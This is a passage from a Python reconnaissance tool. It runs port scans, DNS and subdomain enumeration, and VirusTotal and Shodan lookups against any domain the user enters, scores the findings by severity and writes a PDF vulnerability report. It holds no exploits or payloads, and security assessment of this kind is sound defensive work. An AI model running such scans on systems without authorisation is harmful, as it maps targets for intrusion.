    def add(vuln_id: str, evidence: str = "", override: dict = None):
        entry = dict(VULN_DB[vuln_id])
        entry["id"]       = vuln_id
        entry["evidence"] = evidence
        if override:
            entry.update(override)
        findings.append(entry)

    # ── HTTP Headers ──────────────────────────────────────────────────────────
    headers = scan_data.get("HTTP Headers", {})
    if isinstance(headers, dict):
        hdr = {k.lower(): v for k, v in headers.items()}
        if "content-security-policy" not in hdr:              add("missing_csp")
        if "strict-transport-security" not in hdr:            add("missing_hsts")
        if "x-frame-options" not in hdr and "frame-ancestors" not in hdr.get("content-security-policy", ""):
            add("missing_xframe")
        if "x-content-type-options" not in hdr:               add("missing_xcto")
        if "referrer-policy" not in hdr:                      add("missing_referrer")
        if "permissions-policy" not in hdr:                   add("missing_permissions")
        server = hdr.get("server", "")
        if server and any(c.isdigit() for c in server):
            add("server_version_disclosure", evidence=f"Server: {server}")
        xpb = hdr.get("x-powered-by", "")
        if xpb:
            add("xpowered_disclosure", evidence=f"X-Powered-By: {xpb}")
        cookie = hdr.get("set-cookie", "")
        if cookie:
            if "secure"   not in cookie.lower(): add("cookie_no_secure",   evidence="Set-Cookie missing 'Secure' flag")
            if "httponly" not in cookie.lower(): add("cookie_no_httponly", evidence="Set-Cookie missing 'HttpOnly' flag")

    # ── SSL ───────────────────────────────────────────────────────────────────
    ssl_data = scan_data.get("SSL Certificate", {})
    if isinstance(ssl_data, dict):
        if ssl_data.get("Protocol", "") in ("TLSv1", "TLSv1.1", "SSLv2", "SSLv3"):
            add("ssl_old_protocol", evidence=f"Negotiated protocol: {ssl_data['Protocol']}")
        if ssl_data.get("Issuer (Org)", "").lower() in ("", "n/a"):
            add("ssl_self_signed", evidence=f"Issuer Org: '{ssl_data.get('Issuer (Org)', '')}'")
        valid_to = ssl_data.get("Valid To", "")
        if valid_to and valid_to != "N/A":
            try:
                if datetime.strptime(valid_to, "%b %d %H:%M:%S %Y %Z") < datetime.utcnow():
                    add("ssl_expired", evidence=f"Expired on: {valid_to}")
            except ValueError:
                pass

    # ── Port Scan ─────────────────────────────────────────────────────────────
    port_data = scan_data.get("Open Ports", {})
    if isinstance(port_data, dict) and "Ports" in port_data:
        for port, info in port_data["Ports"].items():
            if info.get("State") == "open" and port in DANGEROUS_PORTS:
                add(DANGEROUS_PORTS[port], evidence=f"Port {port}/{info.get('Service','unknown')} is OPEN")

    # ── DNS ───────────────────────────────────────────────────────────────────
    dns_data = scan_data.get("DNS Records", {})
    if isinstance(dns_data, dict):
        txt = dns_data.get("TXT", [])
        combined = " ".join(txt).lower() if isinstance(txt, list) else ""
        if "v=spf1"   not in combined: add("missing_spf",   evidence="No SPF record in TXT records")
        if "v=dmarc1" not in combined: add("missing_dmarc", evidence="No DMARC record found")

    # ── VirusTotal ────────────────────────────────────────────────────────────
    vt_data = scan_data.get("VirusTotal", {})
    if isinstance(vt_data, dict) and "Status" not in vt_data:
        malicious  = int(vt_data.get("Malicious Detections", 0) or 0)
        suspicious = int(vt_data.get("Suspicious Detections", 0) or 0)
        if malicious > 0 or suspicious > 0:
            flagged = vt_data.get("Flagged By", "Unknown")
            add("vt_malicious",
                evidence=f"{malicious} malicious + {suspicious} suspicious detections. Engines: {flagged}")

    # ── Shodan CVEs ───────────────────────────────────────────────────────────
    shodan_data = scan_data.get("Shodan Intelligence", {})
    if isinstance(shodan_data, dict) and "Status" not in shodan_data:
        cves_raw = shodan_data.get("CVEs Found", "None")
        if cves_raw and cves_raw != "None":
            cve_list = [c.strip() for c in cves_raw.split(",") if c.strip()]
            for cve in cve_list:
                add("shodan_cve",
                    evidence=f"{cve} detected on IP by Shodan",
                    override={
                        "name": f"Known CVE Detected: {cve}",
                        "cve":  cve,
                    })

    # ── Sort by severity ──────────────────────────────────────────────────────
    order = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]
    findings.sort(key=lambda x: order.index(x.get("severity", "INFO")))
    return findings


def print_vuln_summary(vulns: list) -> None:
    if not vulns:
        print(Fore.GREEN + "\n  [✔] No vulnerabilities detected.")
        return
    sev_colors = {
        "CRITICAL": Fore.RED, "HIGH": Fore.LIGHTRED_EX,
        "MEDIUM": Fore.YELLOW, "LOW": Fore.CYAN, "INFO": Fore.WHITE,
    }
    counts = Counter(v["severity"] for v in vulns)
    print(Fore.WHITE + "\n  ┌─ Vulnerability Summary " + "─" * 40)
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        if counts.get(sev):
            print(sev_colors[sev] + f"  │  {SEVERITY_ICONS[sev]}  {sev:<10} {counts[sev]} finding(s)")
    print(Fore.WHITE + "  └" + "─" * 54)
    for v in vulns[:5]:
        col = sev_colors[v["severity"]]
        print(col + f"\n  {SEVERITY_ICONS[v['severity']]} [{v['severity']}] {v['name']}")
        if v.get("evidence"):
            print(Fore.WHITE + f"      Evidence : {v['evidence']}")
        print(Fore.WHITE + f"      Reference: {v['reference']}")
    if len(vulns) > 5:
        print(Fore.CYAN + f"\n  ... and {len(vulns) - 5} more finding(s) — see full PDF report.\n")


# ─── Parallel Execution ───────────────────────────────────────────────────────
def run_all_checks(domain: str, ip: str) -> dict:
    # Core recon tasks run in parallel
    tasks = {
        "WHOIS Data":       (get_whois,        domain),
        "DNS Records":      (get_dns,           domain),
        "HTTP Headers":     (get_http_headers,  domain),
        "SSL Certificate":  (get_ssl_info,      domain),
        "Open Ports":       (port_scan,         ip),
        "Website Metadata": (get_metadata,      domain),
        # Threat intelligence tasks
        "VirusTotal":       (scan_virustotal,   domain),
        "Shodan Intelligence": (scan_shodan,    ip),
        "DNSDumpster":      (scan_dnsdumpster,  domain),
    }
    results = {"IP Address": ip}
    with ThreadPoolExecutor(max_workers=9) as pool:
        futures = {pool.submit(fn, arg): key for key, (fn, arg) in tasks.items()}
        for future in as_completed(futures, timeout=SCAN_TIMEOUT):
            key = futures[future]
            try:
                results[key] = future.result()
                _ok(key)
            except Exception as e:
                results[key] = f"Task failed: {e}"
                _fail(key, str(e))

    _status("Analysing vulnerabilities")
    vuln_list = check_vulnerabilities(results)
    results["Vulnerabilities"] = vuln_list
    critical = sum(1 for v in vuln_list if v["severity"] == "CRITICAL")
    high     = sum(1 for v in vuln_list if v["severity"] == "HIGH")
    _ok(f"Vulnerability Analysis → {len(vuln_list)} finding(s)  [🔴 Critical: {critical}  🟠 High: {high}]")
    return results

# ══════════════════════════════════════════════════════════════════════════════
# ─── PDF Generation ───────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

# ─── PDF Colours ──────────────────────────────────────────────────────────────
DARK_BLUE   = colors.HexColor("#7A9FD2")
MID_BLUE    = colors.HexColor("#2C5282")
LIGHT_GREY  = colors.HexColor("#F7FAFC")
MID_GREY    = colors.HexColor("#CBD5E0")
TEXT_DARK   = colors.HexColor("#1A202C")
GREEN_HDR   = colors.HexColor("#276749")
PURPLE_HDR  = colors.HexColor("#553C9A")
ORANGE_HDR  = colors.HexColor("#C05621")
RED_HDR     = colors.HexColor("#9B2335")
TEAL_HDR    = colors.HexColor("#25B4BC")
VULN_HDR    = colors.HexColor("#6B21A8")
VT_HDR      = colors.HexColor("#B91C1C")   # VirusTotal section — deep red
SHODAN_HDR  = colors.HexColor("#1D4ED8")   # Shodan section — indigo
DNS_DMP_HDR = colors.HexColor("#065F46")   # DNSDumpster section — dark green

SEV_COLORS_PDF = {
    "CRITICAL": colors.HexColor("#9B2335"),
    "HIGH":     colors.HexColor("#C05621"),
    "MEDIUM":   colors.HexColor("#B7791F"),
    "LOW":      colors.HexColor("#2B6CB0"),
    "INFO":     colors.HexColor("#718096"),
}

# ─── PDF Helpers ──────────────────────────────────────────────────────────────
def _build_styles():
    base = getSampleStyleSheet()
    def ps(name, **kw): return ParagraphStyle(name, parent=base["Normal"], **kw)
    return {
        "title":      ParagraphStyle("ReconTitle", parent=base["Title"], fontSize=20, textColor=DARK_BLUE, spaceAfter=4, alignment=TA_CENTER),
        "subtitle":   ps("ReconSubtitle", fontSize=10, textColor=colors.HexColor("#718096"), alignment=TA_CENTER, spaceAfter=2),
        "section":    ps("Section", fontSize=10, textColor=colors.white, spaceBefore=0, spaceAfter=0, leftIndent=8, fontName="Helvetica-Bold"),
        "normal":     ps("ReconNormal", fontSize=8.5, leading=13, textColor=TEXT_DARK),
        "summary":    ps("ReconSummary", fontSize=9, leading=14, textColor=TEXT_DARK, leftIndent=10, rightIndent=10),
        "meta_val":   ps("MetaVal", fontSize=9, textColor=DARK_BLUE, fontName="Helvetica-Bold"),
        "footer":     ps("Footer", fontSize=7.5, textColor=colors.HexColor("#A0AEC0"), alignment=TA_CENTER, fontName="Helvetica-Oblique"),
        "vuln_label": ps("VulnLabel", fontSize=9, textColor=colors.white, fontName="Helvetica-Bold"),
        "vuln_body":  ps("VulnBody", fontSize=8.5, leading=13, textColor=TEXT_DARK),
    }

def _cell(value, style) -> Paragraph:
    text = str(value) if value is not None else "N/A"
    return Paragraph(
        text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\n", "<br/>"),
        style
    )

def _section_banner(title: str, colour, styles, W) -> list:
    tbl = LongTable([[Paragraph(f"  {title}", styles["section"])]], colWidths=[W])
    tbl.setStyle(TableStyle([
        ("BACKGROUND",    (0, 0), (-1, -1), colour),
        ("TOPPADDING",    (0, 0), (-1, -1), 7),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 7),
        ("LEFTPADDING",   (0, 0), (-1, -1), 0),
        ("RIGHTPADDING",  (0, 0), (-1, -1), 0),
    ]))
    return [tbl, Spacer(1, 6)]

def _kv_table(rows: list, col_widths: list, colour) -> LongTable:
    tbl = LongTable(rows, colWidths=col_widths, repeatRows=1)
    tbl.setStyle(TableStyle([
        ("BACKGROUND",     (0, 0), (-1,  0), colour),
        ("TEXTCOLOR",      (0, 0), (-1,  0), colors.white),
        ("FONTNAME",       (0, 0), (-1,  0), "Helvetica-Bold"),
        ("FONTSIZE",       (0, 0), (-1,  0), 9),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, LIGHT_GREY]),
        ("VALIGN",         (0, 0), (-1, -1), "TOP"),
        ("LEFTPADDING",    (0, 0), (-1, -1), 9),
        ("RIGHTPADDING",   (0, 0), (-1, -1), 9),
        ("TOPPADDING",     (0, 0), (-1, -1), 6),
        ("BOTTOMPADDING",  (0, 0), (-1, -1), 6),
        ("GRID",           (0, 0), (-1, -1), 0.4, MID_GREY),
        ("LINEBELOW",      (0, 0), (-1,  0), 1.5, colour),
    ]))
    return tbl

# ─── PDF Builder ──────────────────────────────────────────────────────────────
def save_pdf(domain: str, data: dict) -> str:
    filename = f"reports/{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
    doc = SimpleDocTemplate(
        filename, pagesize=A4,
        rightMargin=36, leftMargin=36, topMargin=50, bottomMargin=36,
        title=f"Recon Report – {domain}", author="CLI Recon Tool",
    )
    W  = A4[0] - doc.leftMargin - doc.rightMargin
    S  = _build_styles()
    el = []

    # ── Header ────────────────────────────────────────────────────────────────
    el += [
        Paragraph("WEBSITE RECONNAISSANCE", S["title"]),
        Paragraph("Security Information & Vulnerability Report", S["subtitle"]),
        Spacer(1, 4),
        HRFlowable(width="100%", thickness=2, color=MID_BLUE, spaceAfter=10),
    ]

    # ── Meta bar ──────────────────────────────────────────────────────────────
    machine_ip = get_machine_ip()
    meta_tbl = LongTable([[
        _cell(f"Target: {domain}", S["meta_val"]),
        _cell(f"Date: {datetime.now().strftime('%d %b %Y  %H:%M')}", S["meta_val"]),
        _cell(f"Scanner IP: {machine_ip}", S["meta_val"]),
    ]], colWidths=[W * 0.38, W * 0.32, W * 0.30])
    meta_tbl.setStyle(TableStyle([
        ("BACKGROUND",    (0, 0), (-1, -1), LIGHT_GREY),
        ("VALIGN",        (0, 0), (-1, -1), "MIDDLE"),
        ("LEFTPADDING",   (0, 0), (-1, -1), 10),
        ("RIGHTPADDING",  (0, 0), (-1, -1), 10),
        ("TOPPADDING",    (0, 0), (-1, -1), 8),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 8),
        ("BOX",           (0, 0), (-1, -1), 0.5, MID_GREY),
        ("INNERGRID",     (0, 0), (-1, -1), 0.3, MID_GREY),
    ]))
    el += [meta_tbl, Spacer(1, 14)]

    # ── Executive Summary ─────────────────────────────────────────────────────
    vulns      = data.get("Vulnerabilities", [])
    sev_counts = Counter(v["severity"] for v in vulns)

    # Build threat intel summary line
    vt_data     = data.get("VirusTotal", {})
    shodan_data = data.get("Shodan Intelligence", {})
    vt_status   = (
        f"VirusTotal: {vt_data.get('Malicious Detections', 'N/A')} malicious detection(s)."
        if isinstance(vt_data, dict) and "Status" not in vt_data
        else "VirusTotal: not queried or key not set."
    )
    shodan_status = (
        f"Shodan CVEs: {shodan_data.get('CVEs Found', 'none')}."
        if isinstance(shodan_data, dict) and "Status" not in shodan_data
        else "Shodan: not queried or key not set."
    )

    el += _section_banner("EXECUTIVE SUMMARY", MID_BLUE, S, W)
    el += [Paragraph(
        f"This automated reconnaissance scan collected publicly available information about "
        f"<b>{domain}</b> and analysed it for known security weaknesses. The scan covered DNS, "
        f"HTTP headers, SSL/TLS, open ports, website metadata, cookie security, and external "
        f"threat intelligence (VirusTotal, Shodan, DNSDumpster). "
        f"<b>{len(vulns)} potential vulnerabilities</b> were identified: "
        f"{sev_counts.get('CRITICAL',0)} Critical, {sev_counts.get('HIGH',0)} High, "
        f"{sev_counts.get('MEDIUM',0)} Medium, {sev_counts.get('LOW',0)} Low. "
        f"{vt_status} {shodan_status} "
        f"For authorised security assessment use only.",
        S["summary"]
    ), Spacer(1, 18)]

    # ── Domain / WHOIS ────────────────────────────────────────────────────────
    el += _section_banner("DOMAIN INTELLIGENCE", DARK_BLUE, S, W)
    rows = [[_cell("Parameter", S["normal"]), _cell("Details", S["normal"])],
            [_cell("IP Address", S["normal"]), _cell(data.get("IP Address"), S["normal"])]]
    whois_data = data.get("WHOIS Data", {})
    rows += [[_cell(k, S["normal"]), _cell(v, S["normal"])] for k, v in whois_data.items()] \
        if isinstance(whois_data, dict) else [[_cell("Error", S["normal"]), _cell(whois_data, S["normal"])]]
    el += [_kv_table(rows, [W * 0.32, W * 0.68], DARK_BLUE), Spacer(1, 18)]

    # ── DNS ───────────────────────────────────────────────────────────────────
    el += _section_banner("DNS FOOTPRINTING", GREEN_HDR, S, W)
    rows = [[_cell("Record Type", S["normal"]), _cell("Value", S["normal"])]]
    rows += [[_cell(k, S["normal"]), _cell(", ".join(v) if isinstance(v, list) else v, S["normal"])]
             for k, v in data.get("DNS Records", {}).items()]
    el += [_kv_table(rows, [W * 0.18, W * 0.82], GREEN_HDR), Spacer(1, 18)]

    # ── HTTP Headers ──────────────────────────────────────────────────────────
    el += _section_banner("WEB SERVER FOOTPRINT", PURPLE_HDR, S, W)
    rows = [[_cell("Header", S["normal"]), _cell("Value", S["normal"])]]
    http_headers = data.get("HTTP Headers", {})
    rows += [[_cell(k, S["normal"]), _cell(v, S["normal"])] for k, v in http_headers.items()] \
        if isinstance(http_headers, dict) else [[_cell("Error", S["normal"]), _cell(http_headers, S["normal"])]]
    el += [_kv_table(rows, [W * 0.35, W * 0.65], PURPLE_HDR), Spacer(1, 18)]

    # ── SSL ───────────────────────────────────────────────────────────────────
    el += _section_banner("SSL / TLS CERTIFICATE", ORANGE_HDR, S, W)
    rows = [[_cell("Parameter", S["normal"]), _cell("Value", S["normal"])]]
    ssl_data = data.get("SSL Certificate", {})
    rows += [[_cell(k, S["normal"]), _cell(v, S["normal"])] for k, v in ssl_data.items()] \
        if isinstance(ssl_data, dict) else [[_cell("Status", S["normal"]), _cell(ssl_data, S["normal"])]]
    el += [_kv_table(rows, [W * 0.30, W * 0.70], ORANGE_HDR), Spacer(1, 18)]

    # ── Port Scan ─────────────────────────────────────────────────────────────
    el += _section_banner("PORT ENUMERATION", RED_HDR, S, W)
    port_result = data.get("Open Ports", {})
    rows = [[_cell("Port", S["normal"]), _cell("State", S["normal"]), _cell("Service", S["normal"])]]
    if isinstance(port_result, dict) and "Ports" in port_result:
        el += [Paragraph(
            f"Host state: <b>{port_result.get('Host State','N/A')}</b>  |  Ports detected: <b>{len(port_result['Ports'])}</b>",
            S["summary"]
        ), Spacer(1, 6)]
        rows += [[_cell(str(p), S["normal"]), _cell(i.get("State","?"), S["normal"]), _cell(i.get("Service","?"), S["normal"])]
                 for p, i in port_result["Ports"].items()]
    else:
        rows.append([_cell("Error", S["normal"]), _cell(str(port_result), S["normal"]), _cell("", S["normal"])])
    tbl = _kv_table(rows, [W * 0.15, W * 0.20, W * 0.65], RED_HDR)
    if isinstance(port_result, dict) and "Ports" in port_result:
        for i, (_, info) in enumerate(port_result["Ports"].items(), start=1):
            if   info.get("State") == "open":      tbl.setStyle(TableStyle([("TEXTCOLOR", (1,i),(1,i), colors.HexColor("#276749"))]))
            elif info.get("State") == "filtered":   tbl.setStyle(TableStyle([("TEXTCOLOR", (1,i),(1,i), colors.HexColor("#C05621"))]))
    el += [tbl, Spacer(1, 18)]

    # ── Website Metadata ──────────────────────────────────────────────────────
    el += _section_banner("METADATA RECON", TEAL_HDR, S, W)
    rows = [[_cell("Parameter", S["normal"]), _cell("Value", S["normal"])]]
    meta = data.get("Website Metadata", {})
    rows += [[_cell(k, S["normal"]), _cell(v, S["normal"])] for k, v in meta.items()] \
        if isinstance(meta, dict) else [[_cell("Error", S["normal"]), _cell(meta, S["normal"])]]
    el += [_kv_table(rows, [W * 0.25, W * 0.75], TEAL_HDR), Spacer(1, 18)]

    # ══════════════════════════════════════════════════════════════════════════
    # ── THREAT INTELLIGENCE SECTIONS (NEW) ───────────────────────────────────
    # ══════════════════════════════════════════════════════════════════════════

    # ── VirusTotal ────────────────────────────────────────────────────────────
    el += _section_banner("VIRUSTOTAL THREAT INTELLIGENCE", VT_HDR, S, W)
    vt = data.get("VirusTotal", {})
    if isinstance(vt, dict):
        if "Status" in vt:
            el.append(Paragraph(f"  {vt['Status']}", S["summary"]))
        else:
            malicious = int(vt.get("Malicious Detections", 0) or 0)
            rows = [[_cell("Field", S["normal"]), _cell("Value", S["normal"])]]
            rows += [[_cell(k, S["normal"]), _cell(v, S["normal"])] for k, v in vt.items()]
            tbl = _kv_table(rows, [W * 0.35, W * 0.65], VT_HDR)
            # Colour malicious count red if > 0
            for i, k in enumerate(vt.keys(), start=1):
                if k == "Malicious Detections" and malicious > 0:
                    tbl.setStyle(TableStyle([("TEXTCOLOR", (1,i),(1,i), colors.HexColor("#9B2335")),
                                             ("FONTNAME",  (1,i),(1,i), "Helvetica-Bold")]))
            el.append(tbl)
    else:
        el.append(Paragraph(f"  {str(vt)}", S["summary"]))
    el.append(Spacer(1, 18))

    # ── Shodan ────────────────────────────────────────────────────────────────
    el += _section_banner("SHODAN INTELLIGENCE", SHODAN_HDR, S, W)
    sh = data.get("Shodan Intelligence", {})
    if isinstance(sh, dict):
        if "Status" in sh:
            el.append(Paragraph(f"  {sh['Status']}", S["summary"]))
        else:
            rows = [[_cell("Field", S["normal"]), _cell("Value", S["normal"])]]
            rows += [[_cell(k, S["normal"]), _cell(v, S["normal"])] for k, v in sh.items()]
            tbl = _kv_table(rows, [W * 0.25, W * 0.75], SHODAN_HDR)
            # Highlight CVEs row red if CVEs found
            for i, k in enumerate(sh.keys(), start=1):
                if k == "CVEs Found" and sh.get("CVEs Found", "None") != "None":
                    tbl.setStyle(TableStyle([("TEXTCOLOR", (1,i),(1,i), colors.HexColor("#9B2335")),
                                             ("FONTNAME",  (1,i),(1,i), "Helvetica-Bold")]))
            el.append(tbl)
    else:
        el.append(Paragraph(f"  {str(sh)}", S["summary"]))
    el.append(Spacer(1, 18))

    # ── DNSDumpster ───────────────────────────────────────────────────────────
    el += _section_banner("DNSDUMPSTER — SUBDOMAIN ENUMERATION", DNS_DMP_HDR, S, W)
    dd = data.get("DNSDumpster", {})
    if isinstance(dd, dict):
        if "Status" in dd:
            el.append(Paragraph(f"  {dd['Status']}", S["summary"]))
        else:
            rows = [[_cell("Field", S["normal"]), _cell("Value", S["normal"])]]
            rows += [[_cell(k, S["normal"]), _cell(v, S["normal"])] for k, v in dd.items()]
            el.append(_kv_table(rows, [W * 0.25, W * 0.75], DNS_DMP_HDR))
    else:
        el.append(Paragraph(f"  {str(dd)}", S["summary"]))
    el.append(Spacer(1, 18))

    # ══════════════════════════════════════════════════════════════════════════
    # ── Vulnerability Assessment ──────────────────────────────────────────────
    # ══════════════════════════════════════════════════════════════════════════
    el += _section_banner("VULNERABILITY ASSESSMENT", VULN_HDR, S, W)
    if not vulns:
        el.append(Paragraph("  No vulnerabilities detected based on the collected scan data.", S["summary"]))
    else:
        parts = [f"<b>{SEVERITY_ICONS[s]} {s}:</b> {sev_counts[s]}" for s in SEVERITY_ICONS if sev_counts.get(s)]
        el += [Paragraph("  " + "   ".join(parts), S["summary"]), Spacer(1, 12)]
        for i, vuln in enumerate(vulns, 1):
            sev     = vuln.get("severity", "INFO")
            scolour = SEV_COLORS_PDF.get(sev, colors.grey)
            hdr_tbl = LongTable([[
                _cell(f"{SEVERITY_ICONS.get(sev,'')}  [{sev}]  {i}. {vuln['name']}", S["vuln_label"]),
                _cell(vuln.get("cve", "N/A"), S["vuln_label"]),
            ]], colWidths=[W * 0.68, W * 0.32])
            hdr_tbl.setStyle(TableStyle([
                ("BACKGROUND",    (0, 0), (-1, -1), scolour),
                ("TEXTCOLOR",     (0, 0), (-1, -1), colors.white),
                ("FONTNAME",      (0, 0), (-1, -1), "Helvetica-Bold"),
                ("FONTSIZE",      (0, 0), (-1, -1), 9),
                ("TOPPADDING",    (0, 0), (-1, -1), 7),
                ("BOTTOMPADDING", (0, 0), (-1, -1), 7),
                ("LEFTPADDING",   (0, 0), (-1, -1), 10),
                ("RIGHTPADDING",  (0, 0), (-1, -1), 8),
                ("VALIGN",        (0, 0), (-1, -1), "MIDDLE"),
            ]))
            el.append(hdr_tbl)
            d_rows = [
                [_cell(k, S["normal"]), _cell(vuln.get(fld) or "—", S["vuln_body"])]
                for k, fld in [("Description","description"),("Evidence","evidence"),("Solution","solution"),("Reference","reference")]
            ]
            d_tbl = LongTable(d_rows, colWidths=[W * 0.17, W * 0.83])
            d_tbl.setStyle(TableStyle([
                ("BACKGROUND",     (0, 0), (0, -1), colors.HexColor("#F3F0FF")),
                ("FONTNAME",       (0, 0), (0, -1), "Helvetica-Bold"),
                ("FONTSIZE",       (0, 0), (0, -1), 8.5),
                ("ROWBACKGROUNDS", (1, 0), (1, -1), [colors.white, LIGHT_GREY]),
                ("VALIGN",         (0, 0), (-1, -1), "TOP"),
                ("LEFTPADDING",    (0, 0), (-1, -1), 9),
                ("RIGHTPADDING",   (0, 0), (-1, -1), 9),
                ("TOPPADDING",     (0, 0), (-1, -1), 6),
                ("BOTTOMPADDING",  (0, 0), (-1, -1), 6),
                ("GRID",           (0, 0), (-1, -1), 0.4, MID_GREY),
                ("LINEBELOW",      (0, -1), (-1, -1), 1.5, scolour),
            ]))
            el += [d_tbl, Spacer(1, 10)]

    # ── Footer ────────────────────────────────────────────────────────────────
    el += [
        Spacer(1, 20),
        HRFlowable(width="100%", thickness=0.5, color=MID_GREY),
        Spacer(1, 8),
        Paragraph(
            f"Generated by CLI Recon Tool v2.0  ·  For authorised security assessment use only  ·  {datetime.now().strftime('%d %b %Y')}",
            S["footer"]
        ),
    ]
    doc.build(el)
    return filename

# ─── Main ─────────────────────────────────────────────────────────────────────
def main():
    banner()

    # Warn user if API keys are still placeholders
    placeholders = [
        name for name, key in API_KEYS.items()
        if key.startswith("YOUR_") or key == ""
    ]
    if placeholders:
        print(Fore.YELLOW + f"  [!] API keys not configured for: {', '.join(placeholders)}")
        print(Fore.YELLOW +  "  [!] Those modules will be skipped. Edit API_KEYS at the top of this file.\n")

    raw = input(Fore.YELLOW + "Enter target domain: " + Style.RESET_ALL)
    if not raw.strip():
        print(Fore.RED + "No domain entered. Exiting.")
        return
    domain = validate_domain(raw)
    print(Fore.GREEN + f"\n[+] Target: {domain}\n")

    _status("Resolving IP address")
    ip = get_ip(domain)
    if ip.startswith("IP resolution failed"):
        print(Fore.RED + f"\n  [✘] {ip}\n  Cannot continue without a valid IP. Exiting.")
        return
    _ok(f"IP Address → {ip}")

    machine_ip = get_machine_ip()
    save_short_log(domain, machine_ip)

    print(Fore.CYAN + "\n[+] Running recon + threat intelligence tasks in parallel...\n")
    results = run_all_checks(domain, ip)
    results["IP Address"] = ip

    print_vuln_summary(results.get("Vulnerabilities", []))

    # Print a quick threat intel summary in the CLI
    print(Fore.CYAN + "\n[+] Threat Intelligence Summary:")
    vt = results.get("VirusTotal", {})
    if isinstance(vt, dict) and "Status" not in vt:
        mal = vt.get("Malicious Detections", "0")
        sus = vt.get("Suspicious Detections", "0")
        rep = vt.get("Reputation Score", "N/A")
        flag_color = Fore.RED if int(mal) > 0 else Fore.GREEN
        print(flag_color + f"  [VT]     Malicious: {mal}  Suspicious: {sus}  Reputation: {rep}")
    else:
        print(Fore.YELLOW + f"  [VT]     {vt.get('Status', 'No data')}")

    sh = results.get("Shodan Intelligence", {})
    if isinstance(sh, dict) and "Status" not in sh:
        cves = sh.get("CVEs Found", "None")
        ports = sh.get("Open Ports", "N/A")
        cve_color = Fore.RED if cves != "None" else Fore.GREEN
        print(cve_color + f"  [Shodan] CVEs: {cves}  |  Ports: {ports}")
    else:
        print(Fore.YELLOW + f"  [Shodan] {sh.get('Status', 'No data')}")

    dd = results.get("DNSDumpster", {})
    if isinstance(dd, dict) and "Status" not in dd:
        print(Fore.GREEN + f"  [DNS]    {dd.get('Records Found', '0')} records found via {dd.get('Source','DNSDumpster')}")
    else:
        print(Fore.YELLOW + f"  [DNS]    {dd.get('Status', 'No data')}")

    print(Fore.CYAN + "\n[+] Building PDF report...")
    try:
        pdf_file = save_pdf(domain, results)
        logging.info(
            f"Scanned: {domain} | IP: {ip} | Vulns: {len(results.get('Vulnerabilities',[]))} | Report: {pdf_file}"
        )
        print(Fore.GREEN + f"\n  [✔] PDF Report saved → {pdf_file}")
    except Exception as e:
        logging.error(f"PDF generation failed: {e}")
        print(Fore.RED + f"\n  [✘] PDF generation failed: {e}")

    print(Fore.GREEN + "\n[+] Scan complete.\n")

if __name__ == "__main__":
    main()
